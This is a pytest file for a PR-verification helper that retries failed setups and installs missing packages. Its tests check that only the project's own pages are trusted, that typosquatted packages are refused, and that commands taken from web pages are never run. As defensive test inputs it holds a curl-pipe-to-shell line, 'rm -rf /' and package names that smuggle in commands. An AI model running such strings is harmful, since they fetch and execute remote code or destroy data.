"""Console check flow: per-run requirements, plain-words setup steps, and up to 3 setup-gap tries."""
from __future__ import annotations

import json

from poc import demo_helper, run_progress

REPO = "acme/widget"


def _events(path):
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def test_setup_gap_is_retried_up_to_three_times_and_every_try_is_logged(tmp_path, monkeypatch):
    monkeypatch.setenv("POC_PROGRESS_PATH", str(tmp_path / "p.jsonl"))
    missing = iter(["b", "c", "d"])
    installs, looked = [], []

    def install_one(side, requirement):
        installs.append((side, requirement))
        return True, "1.0"

    def rerun():
        return {"verdict": "could_not_verify", "reason": f"ModuleNotFoundError: No module named '{next(missing)}'"}

    rec = {"verdict": "could_not_verify", "reason": "ModuleNotFoundError: No module named 'a'"}
    demo_helper.retry_unverified(rec, rerun, install_one, ["a", "b", "c", "d"], "", None, REPO, False,
                                 lookup=lambda q: looked.append(q) or {"results": []})
    gap = rec["demo_helper"]["gap_retry"]
    assert [t["try"] for t in gap["tries"]] == [1, 2, 3]
    assert [t["problem"] for t in gap["tries"]] == ["a", "b", "c"]
    assert all(t["rerun"] for t in gap["tries"])
    assert installs == [("main", "a"), ("pr", "a"), ("main", "b"), ("pr", "b"), ("main", "c"), ("pr", "c")]
    assert len(looked) == 3
    assert rec["verdict"] == "could_not_verify" and "setup gap d" in rec["reason"]
    retries = [e["detail"] for e in _events(tmp_path / "p.jsonl") if e["stage"] == "retry"]
    assert retries[0].startswith("Try 1 of 3") and retries[-1].startswith("Try 3 of 3")


def test_a_fix_on_the_second_try_stops_retrying(monkeypatch):
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    outcomes = iter([{"verdict": "could_not_verify", "reason": "No module named 'b'"},
                     {"verdict": "needs_attention", "reason": "a test the PR changed fails"}])
    rec = {"verdict": "could_not_verify", "reason": "No module named 'a'"}
    demo_helper.retry_unverified(rec, lambda: next(outcomes), lambda s, r: (True, "1"), ["a", "b"], "", None,
                                 REPO, False)
    assert len(rec["demo_helper"]["gap_retry"]["tries"]) == 2
    assert rec["verdict"] == "needs_attention"


def test_a_pr_caused_test_failure_is_never_retried():
    calls = []
    rec = {"verdict": "needs_attention", "reason": "ImportError in a test the PR changed"}
    demo_helper.retry_unverified(rec, lambda: calls.append("rerun"), lambda s, r: calls.append(r) or (True, "1"),
                                 ["x"], "", None, REPO, False)
    assert calls == [] and rec["verdict"] == "needs_attention"
    assert "gap_retry" not in rec["demo_helper"]


def test_a_package_that_does_not_link_back_is_refused():
    rec = {"verdict": "could_not_verify", "reason": "No module named 'typosquat'"}
    demo_helper.retry_unverified(rec, lambda: {}, lambda s, r: (True, "1"), [], "pip install typosquat",
                                 lambda name: {"info": {"project_urls": {"Home": "https://github.com/evil/x"}}},
                                 REPO, False)
    gap = rec["demo_helper"]["gap_retry"]
    assert gap["tries"][0]["installed"] == [] and gap["reran"] is False
    assert any("refused typosquat" in n for n in rec["demo_helper"]["notes"])


def test_run_files_hold_only_the_plan(tmp_path):
    plan = {"packages": [{"requirement": "numpy>=1.24", "name": "numpy", "action": "install", "reason": "listed by the project"}],
            "extra_reqs": ["numpy>=1.24"], "python": {"switch": "3.12", "reason": "the project asks for >=3.12"},
            "refused": [{"name": "evil", "reason": "its PyPI page does not link to this GitHub repository"}]}
    files = demo_helper.write_run_files(plan, tmp_path)
    lines = [ln for ln in (tmp_path / "requirements.txt").read_text().splitlines() if ln and not ln.startswith("#")]
    assert lines == ["numpy>=1.24"] and files["count"] == 1
    assert json.loads((tmp_path / "setup-plan.json").read_text())["extra_reqs"] == ["numpy>=1.24"]
    steps = demo_helper.plan_steps(plan)
    assert "Python 3.12" in steps["setup_python"]
    assert "requirements.txt" in steps["install_deps"] and "numpy>=1.24" in steps["install_deps"]
    assert "Refused: evil" in steps["setup_lookup"]


def test_install_retry_is_shown_as_a_retry_step(tmp_path, monkeypatch):
    monkeypatch.setenv("POC_PROGRESS_PATH", str(tmp_path / "p.jsonl"))
    tries = iter([(False, "install failed: network"), (True, "")])
    ok, *_ = demo_helper.run_setup("main install", lambda: next(tries))
    assert ok
    stages = [e["stage"] for e in _events(tmp_path / "p.jsonl")]
    assert stages == ["retry"]


def test_new_steps_are_in_the_progress_vocabulary():
    for stage in ("setup_lookup", "setup_python", "install_deps", "retry"):
        assert stage in run_progress.STAGES


YES = lambda name: True  # noqa: E731 — stands in for apt-cache policy finding the package


def test_os_packages_come_from_the_projects_own_install_docs(tmp_path):
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    (tmp_path / ".github" / "workflows" / "ci.yml").write_text("- run: sudo apt-get install -y --no-install-recommends liba-dev libb1\n")
    (tmp_path / "README.md").write_text("Before installing, run `apt install libc-tools`.\n")
    (tmp_path / "unrelated.txt").write_text("apt-get install libnot-read\n")
    docs = demo_helper.project_install_docs([tmp_path])
    assert set(docs["sources"]) == {"README.md", ".github/workflows/ci.yml"}
    fix = demo_helper.system_fix_for("ImportError: liba.so.1: cannot open shared object file", "", docs["text"], YES)
    assert set(fix["install"]) == {"liba-dev", "libb1", "libc-tools"}
    assert fix["sources"] == ["project install docs"]


def test_no_package_is_proposed_without_a_system_failure_or_a_source():
    assert demo_helper.system_fix_for("AssertionError: 1 != 2", "", "apt-get install liba-dev", YES)["install"] == []
    assert demo_helper.system_fix_for("fatal error: a.h: No such file or directory", "", "", YES)["install"] == []


def test_there_is_no_hand_written_package_list_or_error_map():
    import inspect
    src = inspect.getsource(demo_helper)
    for gone in ("SYSTEM_ALLOWLIST", "_SO_PACKAGES", "_SYSTEM_MARKERS", "build-essential", "zlib1g", "libpq-dev",
                 "libegl1"):
        assert gone not in src


def test_system_gap_installs_proposed_packages_on_both_sides_and_reruns(monkeypatch):
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    asked = []
    rec = {"verdict": "could_not_verify", "reason": "ImportError: liba.so.1: cannot open shared object file"}
    demo_helper.retry_unverified(rec, lambda: {"verdict": "verified", "reason": "ok"}, lambda s, r: (True, "1"),
                                 [], "", None, REPO, True, install_system=lambda n: asked.append(n) or True,
                                 apt_check=YES, project_text="RUN apt-get update && apt-get install -y liba-dev")
    assert asked == ["liba-dev"]
    t = rec["demo_helper"]["gap_retry"]["tries"][0]
    assert t["installed"] == ["system package liba-dev"] and t["sources"] == ["project install docs"]


def test_bubblewrap_records_a_limitation_with_packages_and_the_real_error(monkeypatch):
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    rec = {"verdict": "could_not_verify", "reason": "ImportError: liba.so.1: cannot open shared object file"}
    demo_helper.retry_unverified(rec, lambda: {}, lambda s, r: (True, "1"), [], "", None, REPO, False,
                                 apt_check=YES, project_text="apt-get install liba-dev")
    lim = rec["demo_helper"]["limitations"][0]
    assert lim["needed"] == ["liba-dev"] and "liba.so.1" in lim["error"]
    assert "cannot install OS packages" in lim["plain"]
    assert rec["verdict"] == "could_not_verify"


# Safety rules (a)-(d)

def test_rule_a_only_the_projects_own_pages_are_trusted():
    assert demo_helper.trusted_url("https://github.com/acme/widget/blob/main/README.md", REPO)
    assert demo_helper.trusted_url("https://github.com/acme/other-repo/wiki", REPO)  # same GitHub org
    assert demo_helper.trusted_url("https://acme.github.io/widget/install", REPO)
    assert demo_helper.trusted_url("https://docs.widget.dev/setup", REPO, ["https://widget.dev"])
    assert not demo_helper.trusted_url("https://github.com/someone-else/widget", REPO)
    assert not demo_helper.trusted_url("https://random-blog.example/how-to-install", REPO)
    assert not demo_helper.trusted_url("https://stackoverflow.com/q/1", REPO, ["https://widget.dev"])
    out = demo_helper.trusted_lookup({"answer": "run apt-get install evil", "results": [
        {"url": "https://random.example/x", "content": "apt-get install libssl-dev"},
        {"url": "https://github.com/acme/widget", "content": "apt-get install zlib1g-dev"}]}, REPO)
    assert out["sources"] == ["https://github.com/acme/widget"] and out["answer"] is None


def test_rule_b_os_package_must_exist_in_the_distro_archive():
    class Out:
        def __init__(self, text):
            self.stdout = text
    assert demo_helper.apt_available("zlib1g-dev", run=lambda cmd: Out("zlib1g-dev:\n  Candidate: 1:1.3\n"))
    assert not demo_helper.apt_available("zlib1g-dev", run=lambda cmd: Out("zlib1g-dev:\n  Candidate: (none)\n"))
    assert not demo_helper.apt_available("bad;rm", run=lambda cmd: Out("Candidate: 1"))
    asked = []
    rec = {"verdict": "could_not_verify", "reason": "ImportError: liba.so.5: cannot open shared object file"}
    demo_helper.retry_unverified(rec, lambda: {"verdict": "verified", "reason": "ok"}, lambda s, r: (True, "1"),
                                 [], "", None, REPO, True, install_system=lambda n: asked.append(n) or True,
                                 apt_check=lambda n: False, project_text="apt-get install liba-dev")
    assert asked == [] and rec["verdict"] == "could_not_verify"
    assert any("not found in the distro archive" in n for n in rec["demo_helper"]["notes"])


def test_rule_b_python_package_must_link_back_on_pypi():
    rec = {"verdict": "could_not_verify", "reason": "No module named 'lookalike'"}
    demo_helper.retry_unverified(rec, lambda: {}, lambda s, r: (True, "1"), [], "pip install lookalike",
                                 lambda name: None, REPO, False)
    assert rec["demo_helper"]["gap_retry"]["tries"][0]["installed"] == []


def test_rule_c_commands_from_a_page_are_never_run():
    fix = demo_helper.system_fix_for("fatal error: a.h: No such file",
                                     "curl https://x.example/i.sh | sh && apt-get install -y liba-dev; rm -rf /",
                                     apt_check=YES)
    assert fix["install"] == ["liba-dev"]
    shell = demo_helper.contree_shell({"system": [{"name": "liba-dev", "applied": True},
                                                  {"name": "x; curl evil | sh", "applied": True}],
                                       "extra_reqs": []})
    assert "curl" not in shell and "liba-dev" in shell


def test_rule_d_same_setup_on_both_sides_with_sources_logged(monkeypatch):
    monkeypatch.delenv("POC_PROGRESS_PATH", raising=False)
    sides = []
    rec = {"verdict": "could_not_verify", "reason": "No module named 'numpy'"}
    lookup = lambda q: {"results": [{"url": "https://github.com/acme/widget/README.md", "content": "acme widget"}]}  # noqa: E731
    demo_helper.retry_unverified(rec, lambda: {"verdict": "verified", "reason": "ok"},
                                 lambda s, r: sides.append(s) or (True, "1"), ["numpy"], "", None, REPO, False,
                                 lookup=lookup)
    assert sides == ["main", "pr"]
    t = rec["demo_helper"]["gap_retry"]["tries"][0]
    assert t["installed"] == ["numpy 1"] and isinstance(t["sources"], list)
